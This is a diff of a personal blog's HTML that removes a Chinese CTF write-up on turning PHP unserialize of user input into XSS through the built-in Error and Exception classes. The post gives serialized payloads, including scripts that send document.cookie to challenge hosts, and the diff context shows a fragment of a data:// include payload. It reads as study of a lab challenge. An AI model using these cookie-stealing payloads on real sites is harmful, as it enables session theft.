-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/17/XSS%E4%B9%8B%E5%85%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/17/XSS%E4%B9%8B%E5%85%89/" class="post-title-link" itemprop="url">XSS之光</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-03-17 13:52:42 / Modified: 15:05:37" itemprop="dateCreated datePublished" datetime="2021-03-17T13:52:42+08:00">2021-03-17</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>御剑扫后台，发现git泄露</p>
-<p>Githack扫出index.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];</span><br><span class="line">echo unserialize($a);</span><br></pre></td></tr></table></figure>
-<p>反序列化漏洞，但是没有类，那么则需要一个内置类进行反序列化</p>
-<h2 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">大佬的话：</span><br><span class="line"></span><br><span class="line">Error</span><br><span class="line">适用于php7版本</span><br><span class="line"></span><br><span class="line">Error类就是php的一个内置类用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个to_String的方法。如果有个pop链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 echo 一个反序列化以后的类 的写法，前文说了当对象被当作一个字符串使用时候调用(如echo的时候)会触发__toString方法，这个也看开发人员吧，好的开发人员应该不会这么写，但也是一种挖洞的新思路（对我而言）。</span><br><span class="line"></span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45521281&#x2F;article&#x2F;details&#x2F;105812056</span><br></pre></td></tr></table></figure>
-<p>例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; unserialize($_GET[&#39;daqiang&#39;]);</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>利用Error类</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; new Error(&quot;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo urlencode($b);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;得：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D    生成的 urlencode($b)</span><br></pre></td></tr></table></figure>
-<p>url输入?daqiang=urlencode($b)  会有弹窗：1</p>
-<h2 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h2><p>原理和Error类一样，适用于php5和php7，更好用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; unserialize($_GET[&#39;yds&#39;]);</span><br><span class="line">echo $a;      </span><br><span class="line">?&gt;           </span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; new Exception(&quot;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;得：O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span><br><span class="line">echo unserialize($c);</span><br></pre></td></tr></table></figure>
-<p>回到这个题</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$daqiang &#x3D; new Exception(&quot;&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;a0a58185-02d8-4b85-8dbb-f5a991c8b45c.node3.buuoj.cn&#x2F;?&#39;+document.cookie);&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($daqiang));</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;window.open 是 javaScript 打开新窗口的方法</span><br><span class="line"></span><br><span class="line">也可以用window.location.href&#x3D;&#39;url&#39;来实现恶意跳转</span><br><span class="line">&lt;?php</span><br><span class="line">$daqiang &#x3D; new Exception(&quot;&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;8ff615f3-da70-4d1a-959f-f29d817ecd90.node3.buuoj.cn&#39;+document.cookie&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($daqiang));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或者用alert(document.cookie)直接弹出cookie，但此题不行，可能开了httponly（见附录）。</span><br><span class="line">&lt;?php</span><br><span class="line">$daiqng &#x3D; new Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($daqiang));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -964,11 +1010,11 @@ c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZm
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
